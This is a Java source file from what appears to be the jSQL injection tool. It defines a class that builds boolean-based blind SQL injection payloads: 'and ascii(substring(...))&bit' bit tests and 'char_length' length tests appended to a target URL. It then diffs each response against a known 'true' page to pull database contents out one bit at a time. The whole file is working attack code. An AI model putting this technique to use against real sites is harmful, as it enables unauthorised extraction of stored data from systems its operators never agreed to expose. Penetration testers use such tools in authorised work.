package com.jsql.model.blind;

import java.util.LinkedList;
import java.util.List;

/**
 * Define a call HTTP to the server, require the associated url, character
 * position and bit. Opcodes represents the differences between
 * the TRUE page, and the resulting page.
 */
public class BlindCallable extends AbstractBlindCallable {
    /**
     * List of differences found between the TRUE page, and the present page.
     */
    private LinkedList<diff_match_patch.Diff> opcodes;
    
    /**
     * Constructor for preparation and blind confirmation.
     * @param urlTest
     */
    public BlindCallable(String urlTest) {
        this.blindUrl = "+and+" + urlTest + "--+";
    }
    
    /**
     * Constructor for bit test.
     * @param inj
     * @param indexCharacter
     * @param bit
     */
    public BlindCallable(String inj, int indexCharacter, int bit) {
        blindUrl = "+and+ascii(substring(" + inj + "," + indexCharacter + ",1))%26" + bit + "--+";
        this.currentIndex = indexCharacter;
        this.currentBit = bit;
    }
    
    /**
     * Constructor for length test.
     * @param newUrl
     * @param indexCharacter
     * @param isLengthTest
     */
    public BlindCallable(String newUrl, int indexCharacter, boolean isLengthTest) {
        this.blindUrl = "+and+char_length(" + newUrl + ")>" + indexCharacter + "--+";
        this.isLengthTest = isLengthTest;
    }

    /**
     * Check if a result page means the SQL query is true,
     * confirm that nothing in the resulting page is also defined
     * in the pages from every FALSE SQL queries.
     * @return true if the current SQL query is true
     */
    @Override
    public boolean isTrue() {
        for (diff_match_patch.Diff falseDiff: ConcreteBlindInjection.getConstantFalseMark()) {
            if (this.opcodes.contains(falseDiff)) {
                return false;
            }
        }
        return true;
    }

    /**
     * Process the URL HTTP call, use function inject() from the model.
     * Build the list of differences found between TRUE and the current page.
     * @return Functional Blind Callable
     */
    @Override
    public BlindCallable call() throws Exception {
        String ctnt = ConcreteBlindInjection.callUrl(this.blindUrl);
        opcodes = new diff_match_patch().diff_main(ConcreteBlindInjection.getBlankTrueMark(), ctnt, true);
        new diff_match_patch().diff_cleanupEfficiency(this.opcodes);
        return this;
    }

    @Override
    public List<diff_match_patch.Diff> getOpcodes() {
        return this.opcodes;
    }
}
